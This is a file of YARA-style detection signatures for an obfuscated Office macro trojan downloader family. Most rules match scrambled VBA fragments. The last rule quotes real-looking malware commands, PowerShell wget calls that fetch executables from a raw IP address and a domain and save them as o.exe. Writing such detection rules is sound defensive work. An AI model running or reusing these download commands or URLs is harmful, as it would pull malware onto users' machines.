
rule TrojanDownloader_O97M_Obfuse_BOK_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 22 69 30 30 6a 69 6e 56 22 } //1 = Len(Join(Array("i00jinV"
		$a_01_1 = {3d 20 67 4e 53 41 5f 33 62 76 30 5f 76 42 67 2e 45 4f 66 54 62 5f 77 76 4a } //1 = gNSA_3bv0_vBg.EOfTb_wvJ
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4a 6f 69 6e 28 41 72 72 61 79 28 66 72 69 54 6b 77 51 44 53 20 26 } //1 = Join(Array(friTkwQDS &
		$a_01_1 = {3d 20 44 68 5a 7a 46 38 65 74 59 76 31 6e 49 2e 4a 4c 30 6c 6a 51 77 66 75 4b 6f 41 } //1 = DhZzF8etYv1nI.JL0ljQwfuKoA
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 54 73 35 62 62 6a 46 39 53 2c } //1 = Len(Join(Array(Ts5bbjF9S,
		$a_01_1 = {3d 20 61 42 64 7a 4d 5f 55 77 55 5f 77 4f 61 2e 52 59 4b 66 32 6d 48 63 65 } //1 = aBdzM_UwU_wOa.RYKf2mHce
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 22 68 50 41 66 68 70 55 6a 22 2c } //1 = Len(Join(Array("hPAfhpUj",
		$a_01_1 = {3d 20 7a 5a 48 36 49 49 67 6b 51 66 77 2e 77 65 34 6b 59 4e 69 78 68 6b 7a 47 } //1 = zZH6IIgkQfw.we4kYNixhkzG
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 66 71 41 67 4e 5f 48 41 45 79 5f 4c 69 59 4f 5f 5a 31 6b } //1 = Len(Join(Array(fqAgN_HAEy_LiYO_Z1k
		$a_01_1 = {3d 20 48 61 45 41 57 5f 6f 5a 75 2e 49 5a 43 48 73 49 72 74 48 78 49 73 } //1 = HaEAW_oZu.IZCHsIrtHxIs
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 59 71 44 53 57 30 55 58 79 71 5a 43 48 39 4a } //1 = Len(Join(Array(YqDSW0UXyqZCH9J
		$a_01_1 = {3d 20 4e 70 4a 47 58 5f 76 34 47 76 5f 52 6d 4f 5f 31 6d 4d 58 2e 4a 51 62 41 4e 5f 54 6d 6b 4c 5f 68 6d 35 5f 67 69 32 } //1 = NpJGX_v4Gv_RmO_1mMX.JQbAN_TmkL_hm5_gi2
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 22 4b 4c 41 69 52 7a 54 45 68 79 6d 59 4e 34 62 76 6b 22 2c } //1 = Len(Join(Array("KLAiRzTEhymYN4bvk",
		$a_01_1 = {3d 20 70 47 66 44 6c 5f 73 63 44 64 5f 75 33 32 53 2e 48 4e 4a 69 5f 6b 68 69 65 5f 56 6a 4f 44 5f 43 6f 46 65 } //1 = pGfDl_scDd_u32S.HNJi_khie_VjOD_CoFe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 4c 65 6e 28 4a 6f 69 6e 28 41 72 72 61 79 28 22 42 47 4e 41 6e 5f 64 37 78 5f 75 4b 55 20 4e 30 56 72 74 5f 50 6e 79 5f 4a 42 5a 63 22 } //1 = Len(Join(Array("BGNAn_d7x_uKU N0Vrt_Pny_JBZc"
		$a_01_1 = {3d 20 66 73 6b 63 39 5f 75 68 6c 35 5f 63 45 7a 34 2e 79 55 4d 4b 52 5f 6d 35 59 } //1 = fskc9_uhl5_cEz4.yUMKR_m5Y
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_BOK_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.BOK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 03 00 00 "
		
	strings :
		$a_01_0 = {50 4f 57 45 52 73 68 45 6c 6c 2e 45 78 45 20 77 47 65 74 20 68 74 74 70 3a 2f 2f 31 39 34 2e 31 39 35 2e 32 30 39 2e 38 38 2f 61 70 70 6c 61 75 63 68 68 2e 65 78 65 } //1 POWERshEll.ExE wGet http://194.195.209.88/applauchh.exe
		$a_01_1 = {50 4f 57 45 52 73 68 45 6c 6c 2e 45 78 45 20 77 47 65 74 20 68 74 74 70 73 3a 2f 2f 61 72 74 75 72 6b 61 72 6f 6c 63 7a 61 6b 73 68 69 6f 6c 61 2e 63 6f 6d 2f 6a 61 7a 7a 2f 74 67 36 4e 72 6d 71 39 74 44 4f 37 62 54 49 2e 65 78 65 } //1 POWERshEll.ExE wGet https://arturkarolczakshiola.com/jazz/tg6Nrmq9tDO7bTI.exe
		$a_01_2 = {6f 75 74 46 49 6c 45 20 6f 2e 65 78 65 } //1 outFIlE o.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=2
 
}